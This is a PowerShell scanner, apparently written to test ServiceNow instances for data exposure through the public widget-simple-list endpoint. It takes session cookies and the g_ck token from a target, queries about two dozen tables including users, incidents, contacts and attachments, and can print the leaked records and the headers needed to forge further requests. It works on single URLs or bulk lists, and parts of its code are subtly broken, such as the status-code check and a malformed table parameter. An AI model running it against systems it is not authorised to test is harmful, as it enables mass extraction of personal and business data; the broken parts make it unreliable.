param (
    [string]$url,
    [string]$file,
    [switch]$fastCheck,
    [string]$proxy,
    [switch]$display,
    [switch]$headers
)

function Check-Vulnerability {
    param (
        [string]$url,
        [string]$g_ck_value,
        [hashtable]$cookies,
        [object]$session,
        [hashtable]$proxies,
        [switch]$fastCheck,
        [switch]$display
    )

    $tableList = @(
        "t=cmdb_model&f=name",
        "t=cmn_department&f=app_name",
        "t=kb_knowledge&f=text",
        "t=licensable_app&f=app_name",
        "t=alm_asset&f=display_name",
        "t=sys_attachment&f=file_name",
        "t=sys_attachment_doc&f=data",
        "t=oauth_entity&f=name",
        "t=cmn_cost_center&f=name",
        "t=cmdb_model&f=name",
        "t=sc_cat_item&f=name",
        "t=sn_admin_center_application&f-name",
        "t=cmn_company&f=name",
        "t=customer_account&f=name",
        "t=sys_email_attachment&f=email",
        "t=sys_email_attachment&f=attachment",
        "t=cmn_notif_device&f=email_address",
        "t=sys_portal_age&f=display_name",
        "t=incident&f=short_description",
        "t=work_order&f=number",
        "t=incident&f=number",
        "t=sn_customerservice_case&f=number",
        "t=task&f=number",
        "t=customer_project&f=number",
        "t=customer_project_task&f=number",
        "t=sys_user&f=name",
        "t=customer_contact&f=name"
    )

    if ($fastCheck) {
        $tableList = @("t=kb_knowledge")
    }

    $vulnerableUrls = @()

    foreach ($table in $tableList) {
        $headers = @{
            'Cookie' = ($cookies.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '; '
            'X-UserToken' = $g_ck_value
            'Content-Type' = 'application/json'
            'Accept' = 'application/json'
            'Connection' = 'close'
        }
        if (-not $g_ck_value) {
            $headers.Remove('X-UserToken')
        }

        $postUrl = "$url/api/now/sp/widget/widget-simple-list?$table"
        $dataPayload = '{}'  # Empty JSON payload

        $postResponse = Invoke-RestMethod -Uri $postUrl -Method Post -Headers $headers -Body $dataPayload -Proxy $proxies -UseBasicParsing -SkipCertificateCheck

        if ($postResponse.StatusCode -eq 200 -or $postResponse.StatusCode -eq 201) {
            $responseJson = $postResponse | ConvertFrom-Json
            if ($responseJson.result -and $responseJson.result.data.count -gt 0 -and $responseJson.result.data.list.Count -gt 0) {
                Write-Output "$postUrl is EXPOSED, and LEAKING data. Check ACLs ASAP."
                if ($display) {
                    try {
                        foreach ($item in $responseJson.result.data.list) {
                            $displayValue = $item.display_field.display_value
                            $sysId = $item.sys_id
                            if ($table -like "sys_attachment*") {
                                Write-Output "$url/sys_attachment.do?sys_id=$sysId#$displayValue"
                            } else {
                                Write-Output "$displayValue"
                            }
                        }
                        Write-Output ""
                    } catch {
                        Write-Output 'Failed to extract display data'
                    }
                } else {
                    Write-Output "$postUrl is EXPOSED, but data is NOT leaking likely because ACLs are blocking. Mark Widgets as not Public."
                }
                $vulnerableUrls += $postUrl
            }
        }
    }

    return $vulnerableUrls
}

function Check-UrlGetHeaders {
    param (
        [string]$url,
        [hashtable]$proxies
    )

    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $response = Invoke-WebRequest -Uri $url -SessionVariable session -Proxy $proxies -UseBasicParsing -SkipCertificateCheck
    $cookies = @{}
    foreach ($cookie in $session.Cookies.GetCookies($url)) {
        $cookies[$cookie.Name] = $cookie.Value
    }

    $g_ck_value = $null
    if ($response.Content -match "var g_ck = '([a-zA-Z0-9]+)'") {
        $g_ck_value = $matches[1]
    }

    return $g_ck_value, $cookies, $session
}

function Main {
    param (
        [string]$url,
        [switch]$fastCheck,
        [string]$proxy,
        [switch]$display,
        [switch]$headers
    )

    $proxies = $null
    if ($proxy) {
        $proxies = @{
            'http' = $proxy
            'https' = $proxy
        }
    }

    $url = $url.Trim().TrimEnd('/')
    $g_ck_value, $cookies, $session = Check-UrlGetHeaders -url $url -proxies $proxies
    if (-not $g_ck_value) {
        Write-Output "$url has no g_ck. Continuing test without X-UserToken header"
    }

    $vulnerableUrl = Check-Vulnerability -url $url -g_ck_value $g_ck_value -cookies $cookies -session $session -proxies $proxies -fastCheck:$fastCheck -display:$display
    if ($vulnerableUrl -and $headers) {
        Write-Output "Headers to forge requests:"
        if ($g_ck_value) {
            Write-Output "X-UserToken: $g_ck_value"
        }
        Write-Output "Cookie: " + ($cookies.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '; '
        Write-Output ""
    }

    return [bool]$vulnerableUrl
}

$anyVulnerable = $false  # Track if any URLs are vulnerable

if ($url) {
    $anyVulnerable = Main -url $url -fastCheck:$fastCheck -proxy:$proxy -display:$display -headers:$headers
} elseif ($file) {
    try {
        $urlList = Get-Content -Path $file
        foreach ($url in $urlList) {
            if (Main -url $url -fastCheck:$fastCheck -proxy:$proxy -display:$display -headers:$headers) {
                $anyVulnerable = $true  # At least one URL was vulnerable
            }
        }
    } catch {
        Write-Output "Could not find $file"
    }
}

if (-not $anyVulnerable) {
    Write-Output "Scanning completed. No vulnerable URLs found."
}
